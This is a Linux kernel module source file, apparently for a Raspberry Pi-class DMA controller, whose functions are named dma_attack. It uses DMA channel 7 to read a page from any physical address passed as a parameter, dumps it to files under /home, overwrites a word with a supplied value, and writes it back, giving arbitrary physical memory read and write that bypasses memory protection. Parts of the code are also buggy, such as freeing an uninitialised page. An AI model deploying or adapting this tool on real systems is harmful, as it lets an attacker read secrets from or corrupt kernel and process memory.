#include <linux/module.h>
#include <linux/delay.h>
#include <linux/fs.h>		/* for file_operations */
#include <linux/version.h>	/* versioning */
#include <linux/highmem.h>
#include <linux/slab.h>
#include <linux/io.h>
#include <linux/kernel.h>
#include <linux/init.h>

#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>

#define DMAENABLE 0x00000ff0	//bit 0 should be set to 1 to enable channel 0. bit 1 enables channel 1, etc.
#define DMACH(n) (0x100*(n))
//flags used in the DmaChannelHeader struct:
#define DMA_CS_RESET (1<<31)
#define DMA_CS_ACTIVE (1<<0)

#define DMA_DEBUG_READ_ERROR (1<<2)
#define DMA_DEBUG_FIFO_ERROR (1<<1)
#define DMA_DEBUG_READ_LAST_NOT_SET_ERROR (1<<0)

//flags used in the DmaControlBlock struct:
#define DMA_CB_TI_DEST_INC (1<<4)
#define DMA_CB_TI_SRC_INC (1<<8)
#define DMA_CB_TI_WAIT_RESP (1<<3)
#define DMA_CB_TI_WAITS ((1 << 22) | (1 << 24))

struct file *file_open(const char *path, int flags, int rights) 
{
    struct file *filp = NULL;
    mm_segment_t oldfs;
    int err = 0;

    oldfs = get_fs();
    set_fs(get_ds());
    filp = filp_open(path, flags, rights);
    set_fs(oldfs);
    if (IS_ERR(filp)) {
        err = PTR_ERR(filp);
        return NULL;
    }
    return filp;
}

void file_close(struct file *file) 
{
    filp_close(file, NULL);
}

int file_write(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size) 
{
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = kernel_write(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}

int file_sync(struct file *file) 
{
    vfs_fsync(file, 0);
    return 0;
}

struct DmaChannelHeader {
	uint32_t CS;		//Control and Status
	//31    RESET; set to 1 to reset DMA
	//30    ABORT; set to 1 to abort current DMA control block (next one will be loaded & continue)
	//29    DISDEBUG; set to 1 and DMA won't be paused when debug signal is sent
	//28    WAIT_FOR_OUTSTANDING_WRITES; set to 1 and DMA will wait until peripheral says all writes have gone through before loading next CB
	//24-27 reserved
	//20-23 PANIC_PRIORITY; 0 is lowest priority
	//16-19 PRIORITY; bus scheduling priority. 0 is lowest
	//9-15  reserved
	//8     ERROR; read as 1 when error is encountered. error can be found in DEBUG register.
	//7     reserved
	//6     WAITING_FOR_OUTSTANDING_WRITES; read as 1 when waiting for outstanding writes
	//5     DREQ_STOPS_DMA; read as 1 if DREQ is currently preventing DMA
	//4     PAUSED; read as 1 if DMA is paused
	//3     DREQ; copy of the data request signal from the peripheral, if DREQ is enabled. reads as 1 if data is being requested, else 0
	//2     INT; set when current CB ends and its INTEN=1. Write a 1 to this register to clear it
	//1     END; set when the transfer defined by current CB is complete. Write 1 to clear.
	//0     ACTIVE; write 1 to activate DMA (load the CB before hand)
	uint32_t CONBLK_AD;	//Control Block Address
	uint32_t TI;		//transfer information; see DmaControlBlock.TI for description
	uint32_t SOURCE_AD;	//Source address
	uint32_t DEST_AD;		//Destination address
	uint32_t TXFR_LEN;	//transfer length.
	uint32_t STRIDE;	//2D Mode Stride. Only used if TI.TDMODE = 1
	uint32_t NEXTCONBK;	//Next control block. Must be 256-bit aligned (32 bytes; 8 words)
	uint32_t DEBUG;		//controls debug settings
};

struct DmaControlBlock {
	uint32_t TI;		//transfer information
	//31:27 unused
	//26    NO_WIDE_BURSTS
	//21:25 WAITS; number of cycles to wait between each DMA read/write operation
	//16:20 PERMAP; peripheral number to be used for DREQ signal (pacing). set to 0 for unpaced DMA.
	//12:15 BURST_LENGTH
	//11    SRC_IGNORE; set to 1 to not perform reads. Used to manually fill caches
	//10    SRC_DREQ; set to 1 to have the DREQ from PERMAP gate requests.
	//9     SRC_WIDTH; set to 1 for 128-bit moves, 0 for 32-bit moves
	//8     SRC_INC;   set to 1 to automatically increment the source address after each read (you'll want this if you're copying a range of memory)
	//7     DEST_IGNORE; set to 1 to not perform writes.
	//6     DEST_DREG; set to 1 to have the DREQ from PERMAP gate *writes*
	//5     DEST_WIDTH; set to 1 for 128-bit moves, 0 for 32-bit moves
	//4     DEST_INC;   set to 1 to automatically increment the destination address after each read (Tyou'll want this if you're copying a range of memory)
	//3     WAIT_RESP; make DMA wait for a response from the peripheral during each write. Ensures multiple writes don't get stacked in the pipeline
	//2     unused (0)
	//1     TDMODE; set to 1 to enable 2D mode
	//0     INTEN;  set to 1 to generate an interrupt upon completion
	uint32_t SOURCE_AD;	//Source address
	uint32_t DEST_AD;		//Destination address
	uint32_t TXFR_LEN;	//transfer length.
	uint32_t STRIDE;	//2D Mode Stride. Only used if TI.TDMODE = 1
	uint32_t NEXTCONBK;	//Next control block. Must be 256-bit aligned (32 bytes; 8 words)
	uint32_t _reserved[2];
};

void writeBitmasked(volatile uint32_t * dest, uint32_t mask,
		    uint32_t value)
{
	uint32_t cur = *dest;
	uint32_t new = (cur & (~mask)) | (value & mask);
	*dest = new;
	*dest = new;		//added safety for when crossing memory barriers.
}

void dma_enable(void* start, int dmaChNum)
{
	writeBitmasked(start + DMAENABLE / 4, 1 << dmaChNum, 1 << dmaChNum);
	mdelay(1000);
}
void dma_tx(volatile struct DmaChannelHeader* dmaHeader, void* physSrcPage, void* physDstPage, uint32_t size)
{
	void* virtCbPage;
	void* physCbPage;
	volatile struct DmaControlBlock* cb1;

	memset((void*)dmaHeader, 0, sizeof(struct DmaChannelHeader));
	mdelay(500);

	virtCbPage = (void*)__get_dma_pages(GFP_ATOMIC, 0);
	memset(virtCbPage, 0, 4096);

	if (virtCbPage == NULL) {
		pr_err("Failed allocated physCbPage\n");
		return -1;
	}

	physCbPage = (void *) virt_to_phys(virtCbPage);
	memset(virtCbPage, 0, 4096);

	//dedicate the first 8 words of this page to holding the cb.
	cb1 = (struct DmaControlBlock *) virtCbPage;

	//fill the control block:
	cb1->TI = DMA_CB_TI_SRC_INC | DMA_CB_TI_DEST_INC | DMA_CB_TI_WAITS | DMA_CB_TI_WAIT_RESP;	//after each byte copied, we want to increment the source and destination address of the copy, otherwise we'll be copying to the same address.
	cb1->SOURCE_AD = (uint32_t)physSrcPage;	//set source and destination DMA address
	cb1->DEST_AD = (uint32_t)physDstPage;
	cb1->TXFR_LEN = size;	//transfer 12 bytes
	cb1->STRIDE = 0;	//no 2D stride
	cb1->NEXTCONBK = 0;	//no next control block
	printk("TI STATUS BEFORE: %x\n", cb1->TI);
	mdelay(500);		//give time for the reset command to be handled.

	// 0 -> Active
	// 8 -> DREQ
	// a -> END + DREQ
	// 21 -> ACTIVE + INT + PAUSED
	// printk("DMA phys HEADER ADDR: %llx\n", virt_to_phys(dmaHeader));

	printk("DMA STATUS REGISTER (Before TX) %x\n", dmaHeader->CS);
	dmaHeader->CS = DMA_CS_RESET;	//make sure to disable dma first.
	mdelay(2000);		//give time for the reset command to be handled.
	dmaHeader->DEBUG = DMA_DEBUG_READ_ERROR | DMA_DEBUG_FIFO_ERROR | DMA_DEBUG_READ_LAST_NOT_SET_ERROR;	// clear debug error flags
	dmaHeader->CONBLK_AD = (uint32_t)physCbPage;	//we have to point it to the PHYSICAL address of the control block (cb1)

	printk("DMA STATUS REGISTER (After CB Before Active) %x\n", dmaHeader->CS);
	dmaHeader->CS = DMA_CS_ACTIVE;	//set active bit, but everything else is 0.
	mdelay(9000);


	printk("DMA STATUS REGISTER (AFTER Tx) %x\n", dmaHeader->CS);
printk("TI STATUS AFTER: %x\n", cb1->TI);

	free_pages((unsigned long)virtCbPage, 0);	

}

static void dma_attack_cleanup(void)
{
	printk("dma_attack exit\n");
}

// static phys_addr_t dma_start = 0x3f007000L;
//static int  dma_offset= ;
static int addr = 0;
module_param(addr,int,0660);

static int data = 0;
module_param(data,int,0660);

static int __init dma_attack_init(void)
{
	volatile void *start;
	struct file* F;
		struct file* F1;
	struct file* F2;

	void *physCbPage;
	char *virtSrcPage;
	void *physSrcPage;
	char *virtDstPage;
	void *physDstPage;
	void* physCopyPage;
	void* virtCopyPage;
	void* physNewDstPage;
	void* virtNewDstPage;
	char datafile[40];
	volatile struct DmaChannelHeader *dmaHeader;

	// void* phys_dmaHeader;
	// uint32_t cs = 0;
	int i = 0;

	int dmaChNum = 7;
	phys_addr_t dma_start = 0x3f007000L;

	start = (void*) ioremap_nocache(dma_start, 4096);

	virtDstPage = (char*)__get_dma_pages(GFP_ATOMIC, 0);
	
	if (virtDstPage == NULL) {
		pr_err("Failed allocated virtDstPage\n");
		return -1;
	}

	memset(virtDstPage, 0, 4096);

	physDstPage = (void *) virt_to_phys(virtDstPage);

	// printk("phys src page: %p\n", virtSrcPage);
	// printk("phys dst page: %p\n", physDstPage);
	physSrcPage = (void*)addr;

	printk("copy from: %x to %x\n", (uint32_t)physSrcPage, (uint32_t)physDstPage);
	dma_enable(start, dmaChNum);

	// Set the dma header
	dmaHeader = (volatile struct DmaChannelHeader *) (start + (DMACH(dmaChNum)) / 4);

	dma_tx(dmaHeader, physSrcPage, physDstPage, 4096);
	// printk("Read from %x the data: %x\n", physDstPage, *(uint32_t*)virtDstPage);

	F = file_open("/home/FirstPage.blob",  O_CREAT |  O_RDWR | O_APPEND, S_IRWXU | S_IRWXG | S_IRWXO);
	file_write(F, 0, (char*)virtDstPage, 4096);
	file_sync(F); 
	file_close(F);


	printk("Overriding data with %x\n", data);
	// memset(virtDstPage, 0, 4096);

	// virtCopyPage = (char*)__get_dma_pages(GFP_ATOMIC, 0);
	
	// if (virtCopyPage == NULL) {
	// 	pr_err("Failed allocated virtDstPage\n");
	// 	return -1;
	// }

	// memset(virtCopyPage, 0, 4096);

	// physCopyPage = virt_to_phys(virtCopyPage);

	// *((uint32_t*)virtCopyPage) = data;
	// // Copy the data to the addr
	*((uint32_t*)virtDstPage) = data;
	mdelay(2000);
	F1 = file_open("/home/PageToWrite.blob",  O_CREAT |  O_RDWR | O_APPEND, S_IRWXU | S_IRWXG | S_IRWXO);
	file_write(F1, 0, (char*)virtDstPage, 4096);
	file_sync(F1); 
	file_close(F1);
	dma_tx(dmaHeader, physDstPage, physSrcPage, 4096);
	mdelay(2000);
	// Check if the data really changed
	memset(virtDstPage, 0, 4096);
	mdelay(2000);



	physSrcPage = (void*)addr;

	virtNewDstPage = (char*)__get_dma_pages(GFP_ATOMIC, 0);
	
	if (virtDstPage == NULL) {
		pr_err("Failed allocated virtDstPage\n");
		return -1;
	}

	memset(virtNewDstPage, 0, 4096);

	physNewDstPage = virt_to_phys(virtNewDstPage);

	dma_tx(dmaHeader, physSrcPage, physNewDstPage, 4096);
	// printk("Read from %x the data: %x\n", physDstPage, (uint32_t*)virtDstPage[0]);
	mdelay(5000);
	F2 = file_open("/home/OverridenPage.blob",  O_CREAT |  O_RDWR | O_APPEND, S_IRWXU | S_IRWXG | S_IRWXO);
	file_write(F2, 0, (char*)virtNewDstPage, 4096);
	file_sync(F2); 
	file_close(F2);

	free_pages((unsigned long)virtDstPage, 0);
	free_pages((unsigned long)virtNewDstPage, 0);
	free_pages((unsigned long)virtCopyPage, 0);


	// free_pages((unsigned long)virtSrcPage, 0);
	

	iounmap(start);
	// kunmap(start);
	return 0;
}	

module_init(dma_attack_init);
module_exit(dma_attack_cleanup);

MODULE_DESCRIPTION("memory tests");
MODULE_AUTHOR("Raz Ben Jehuda");
MODULE_LICENSE("GPL");
